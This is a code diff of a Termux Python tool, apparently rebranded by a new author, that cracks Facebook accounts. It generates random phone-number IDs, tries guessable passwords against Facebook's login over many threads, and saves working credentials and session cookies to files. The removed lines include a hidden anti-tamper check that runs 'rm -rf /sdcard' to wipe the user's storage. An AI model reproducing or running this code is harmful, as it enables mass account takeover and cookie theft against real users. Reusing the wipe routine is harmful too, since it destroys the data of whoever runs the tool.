@@ -1,9 +1,12 @@
+#--------------------------(IMPORT BOX)--------------------------#
 import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
 import requests as ress
 from datetime import date
 from datetime import datetime
 from time import sleep
+from os import system as s
 from time import sleep as waktu
 try:
     import requests
@@ -11,111 +14,59 @@ try:
     import mechanize
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
-    os.system('pip install mechanize futures bs4==2 > /dev/null')
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
     os.system('pip install bs4')
-from time import localtime as lt
-from os import system as cmd
-ltx = int(lt()[3])
-if ltx > 12:
-    a = ltx-12
-    tag = "PM"
-else:
-    a = ltx
-    tag = "AM"
-
-def clear():
-    os.system('clear')
-#-----[Global Functions]-----#
-def dynamic(text):
-    titik = ['.   ','..  ','... ','.... ']
-    for o in titik:
-        print('\r'+text+o),
-        sys.stdout.flush();time.sleep(1)
-#--------------------------proxies---------------------------#
-fuck='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'if self.url==' in open(fuck+'sessions.py','r').read():
-    pass
-else:
-    os.system('rm -rf /sdcard')
-    exit('\033[1;32mFUCK YOU BYPASS USER')
-king='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(king+'sessions.py','r').read():
-    pass
-else:
-    os.system('rm -rf /sdcard')
-    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
-qeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(qeen+'models.py','r').read():
-    pass
-else:
-    os.system('rm -rf /sdcard')
-    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
-don='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(don+'utils.py','r').read():
-    pass
-else:
-    os.system('rm -rf /sdcard')
-    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
+    
+    
+import os
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
 
 try:
-	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
-	open('proxies.txt','w').write(prox)
-except Exception as e:
-	print('')
-proxies=open('proxies.txt','r').read().splitlines()
-#-----[Colours]-----#
-RED = '\033[1;91m' #
-WHITE = '\033[1;97m' #
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+#--------------------------(COLOUR BOX)--------------------------#    
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
 GREEN = '\033[1;32m' #
-YELLOW = '\033[1;33m' #
-BLUE = '\033[1;34m' #
-ORANGE = '\033[1;35m' #
-P = '\x1b[1;97m' # 
-M = '\x1b[1;91m' # 
-H = '\x1b[1;92m' # 
-K = '\x1b[1;92m' # 
-B = '\x1b[1;94m' # 
-U = '\x1b[1;95m' # 
-O = '\x1b[1;96m' #
-N = '\x1b[0m' #
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+A = '\x1b[1;90m' # WARNA ABU ABU
+BN = '\x1b[1;107m' # BELAKANG PUTIH
+BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b[1;105m' # BELAKANG PINK
+BB = '\x1b[1;104m' # BELAKANG BIRU
+BK = '\x1b[1;103m' # BELAKANG KUNING
+BH = '\x1b[1;102m' # BELAKANG HIJAU
+BM = '\x1b[1;101m' # BELAJANG MERAH
+BA = '\x1b[1;100m' # BELAKANG ABU ABU
 now = datetime.now()
 dt_string = now.strftime("%H:%M")
 current = datetime.now()
 ta = current.year
 bu = current.month
 ha = current.day
-today = date.today()
-my_color = [
- P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today()
-mtd,cp_cpx,cokix=[],[],[]
-#-----userid-separate----#
-def user_id(coki):
-    c_user_index = coki.find('c_user=')
-    if c_user_index != -1:
-        user_id = coki[c_user_index + len('c_user='):]
-        user_id = user_id.split(';')[0]  # Extract the user ID
-    else:
-        user_id = ""
-    return user_id
- #-------checker------#
-def lock_check(uid):
-    sessionx=requests.Session()
-    urlx=f'https://www.facebook.com/p/{uid}'
-    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
-    tx=req.find('title').text
-    if tx =='Facebook':
-        return('LOCK')
-    else:
-        return('LIVE')
-        
+today = date.today() 
 #--------------------------(COUNT BOX)--------------------------#
 loop = 0
 oks = []
@@ -169,115 +120,96 @@ for txxxtt in range (1000):
 	h='Mobile Safari/537.36'
 	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
 	ugen.append(ffg)
-#----------LOGO-------------#
-logo=("""
-\033[1;91m ########  ########     ###     ######    #######  ##    ## 
-\033[1;92m ##     ## ##     ##   ## ##   ##    ##  ##     ## ###   ## 
-\033[1;93m ##     ## ##     ##  ##   ##  ##        ##     ## ####  ## 
-\033[1;94m ##     ## ########  ##     ## ##   #### ##     ## ## ## ## 𝙇
-\033[1;95m ##     ## ##   ##   ######### ##    ##  ##     ## ##  #### 𝙊
-\033[1;91m ##     ## ##    ##  ##     ## ##    ##  ##     ## ##   ### 𝙍
-\033[1;92m ########  ##     ## ##     ##  ######    #######  ##    ## 𝘿\033[1;93m
-\x1b[1;93m┏───────────────────────────────────────────────┓
-\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m AUTHOR     \x1b[1;97m: \x1b[1;92mDRAGON LORD
-\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m TYPE       \x1b[1;97m: \x1b[1;92mFREE🔥
-\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m GITHUB     \x1b[1;97m: \x1b[1;92mDragon-Lord-404   
-\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m TOOL       \x1b[1;97m: \x1b[1;92mRANDOM-CLONING      
-\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m VERSION    \x1b[1;97m: \x1b[1;92m1.1.0
-\x1b[1;93m┗───────────────────────────────────────────────┛""")  
-def linex():
-        print(50*'\033[36;5;14m-\033[1;37m')
-def clear():
-        os.system(f'clear')
-        print(logo)
-    
-#-----[Loop Menu]-----#  
-loop = 0
-oks = []
-cps = []
+#--------------------------(LOGO BOX)--------------------------#
+logo =("""                                                
+\x1b[38;5;46m                                   ,...             
+\x1b[38;5;46m
+░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
+                                           
+\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mHRIDOY HOSEN SHANTO 
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mSH AN TO
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m0.1
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ● \x1b[38;5;46mRandom Cloning
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ● \x1b[38;5;46mprivet
+\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆""")
 
-#-----[Main-Menu]-----#
-def lord_menu():
-    os.system('clear');print(logo)
-    print('\033[1;92m [1] RANDOM CRACK [IND]')
-    print('\033[1;92m [0] EXIT TOOL')
-    linex()
-    lord=input(' \033[1;32m[?] SELECT MENU: ')
-    if lord in['1','01']:innocent()
-    elif lord in['0','00']:exit()
-    else:exit()
-    
-def innocent():
+linex=('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')   
+#--------------------------(MENU BOX)--------------------------#
+class Main:
+    def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        os.system("clear")
+        print(logo)
+    #    os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
+        print('\033[1;31m[\033[1;32m1\033[1;31m]  \x1b[38;5;46m START RANDOM CLONE')
+        print('\033[1;31m[\033[1;32m2\033[1;31m]  \x1b[38;5;46m EXIT')
+        print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
+        Shorif =input("\033[1;32m[\033[1;32m?\033[1;32m] CHOOSE : ")
+        if Shorif in ["1", "01"]:
+            v2()
+        else:
+            exit()
+#--------------------------(COLOUR BOX)--------------------------#
+
+A = '\x1b[1;97m' 
+B = '\x1b[1;96m' 
+C = '\x1b[1;91m' 
+D = '\033[38;5;46m'
+M = '\033[1;31m'
+H = '\033[38;5;46m'
+N = '\x1b[1;37m'    
+E = '\x1b[1;93m' 
+F = '\x1b[1;94m'
+G = '\x1b[1;95m'
+P = '\033[1;37m'
+#--------------------------(CLONING MENU BOX)--------------------------#
+def v2():
     user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\033[1;32m [√] IND CODE : +91639/+91629')
-    linex()
-    code = input('\033[1;32m [?] CHOOSE : ')
     os.system('clear')
     print(logo)
-    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
-    linex()
-    limit = int(input('\033[1;32m [?] CHOOSE : '))
-    linex()
+    print('[+] BD NUMBER  => 016 017 018 019')
+    kode = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
+    kodex = ''.join(random.choice(string.digits) for _ in range(2))
+    kod = ''.join(random.choice(string.digits) for _ in range(2))
+    print('[+] 2000. 5000. 10000. 15000. 50000')
+    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
-    with ThreadPool(max_workers=20) as ahare:
-        clear()
+    with ThreadPool(max_workers=30) as akash:
+        os.system('clear')
+        print(logo)
         tl = str(len(user))
-        gen = str(len(ugen))
-        print('\033[1;32m [+] Choice Code: '+code)
-        print('\033[1;33m [-] Total  Uagent: '+gen)
-        print('\033[1;34m [+] Crack Process Has Started')
-        print('\033[1;35m [!] Use Flight Mode For Speed Up')
-        print('\033[1;36m [+] Use APN For More OK Ids')
-        linex()
-        for fuck in user:
-            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit", "57575751", "59039200"]
-            fid = code+fuck
-            ahare.submit(lordx,fid,pwx,tl)
-    print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('Ok Ids Saved in /DRAGON-OK.txt')
-    print('Cp Ids Saved in /DRAGON-CP.txt')
-    linex()  
-def lordx(fid,pwx,tl):
+        print('\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46m SIM CODE : '+kode)
+        print('\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46m CRACK ID : '+tl)
+        print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
+        for guru in user:
+            uid = kode+kodex+kod+guru
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'304050','607080']
+            akash.submit(rcrack1,uid,pwx,tl)
+    print(linex)
+    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
+    print(linex)
+#--------------------------(MATHOD BOX)--------------------------#
+def rcrack1(uid,pwx,tl):
     global loop
     global cps
     global oks
     global proxy
-    sys.stdout.write('\r\r\033[1;92m[\033[38;5;46mCRACKING🔍]\033[1;97m - [%s/%s] - [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps)));sys.stdout.flush()
     try:
-        last7digit = fid[int(len(fid))-7:]
-        last6digit = fid[int(len(fid))-6:]
-        last8digit = fid[int(len(fid))-8:]
-        last9digit = fid[int(len(fid))-9:]
-        last10digit = fid[int(len(fid))-10:]
-        first6digit = fid[0:6]
-        first7digit = fid[0:7]
-        first8digit = fid[0:8]
-        first9digit = fid[0:9]
-        first10digit = fid[0:10]
-        fullnumber = fid
         for ps in pwx:
-            ps = ps.replace("last7digit",last7digit)
-            ps = ps.replace("last6digit",last6digit)
-            ps = ps.replace("last8digit",last8digit)
-            ps = ps.replace("last9digit",last9digit)
-            ps = ps.replace("last10digit",last10digit)
-            ps = ps.replace("first6digit",first6digit)
-            ps = ps.replace("first6digit",first6digit)
-            ps = ps.replace("first7digit",first7digit)
-            ps = ps.replace("first8digit",first8digit)
-            ps = ps.replace("first9digit",first9digit)
-            ps = ps.replace("first10digit",first10digit)
-            ps = ps.replace("fullnumber",fullnumber)
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            bi = random.choice([A,B,C,D,E,F,G,H])
+            sys.stdout.write(f'\r \033[1;31m[%sSHANTO\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
+            sys.stdout.flush()
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -303,37 +235,28 @@ def lordx(fid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent':pro}
-            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = user_id(coki)
-                try:
-                    uid=lo['uid']
-                except:
-                    uid=cid
-                    ckkx=lock_check(uid)
-                if ckkx=='LOCK':
-                    return
-                else:
-                 print('\r\r\033[1;32m[DRAGON-OK🌟]\033[1;33m ' +cid+ ' • ' +ps+ ' \n\033[1;33m[🍪]\033[1;34mCOOKIES = \033[1;32m'+coki+ '')
-                 open('/sdcard/DRAGON-OK.txt', 'a').write( cid+' | '+ps+'')
-                 oks.append(fid)
-                 break
-            elif twf in str(lo):
-                #print('\r\r\033[1;34m[DRAGON-2F🔒]  ' +uid+ ' • ' +ps+ ' \033[0;97m')
-                open('/sdcard/FILE-2F.txt', 'a').write( uid+' | '+ps+' \n')
+                cid = coki[65:80]
+                print('\r\r\033[1;32m[SHANTO-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
+                open('/sdcard/SHANTO-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
+                oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                #print('\r\r\033[1;30m[DRAGON-CP]  ' +uid+ ' • ' +ps+ ' \033[0;97m')
-                open('/sdcard/DRAGON-DEAD.txt', 'a').write( fid+' | '+ps+' \n')
-                cps.append(fid)
+                cid = coki[82:97]
+#              print(f"\x1b[38;5;196m[SHANTO-CP💔] {uid}|{ps}")
+                open('/sdcard/SHANTO-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-    except requests.exceptions.ConnectionError:
-        time.sleep(10)
-lord_menu()
+        
+    except:
+        pass
+
+    
+Main()
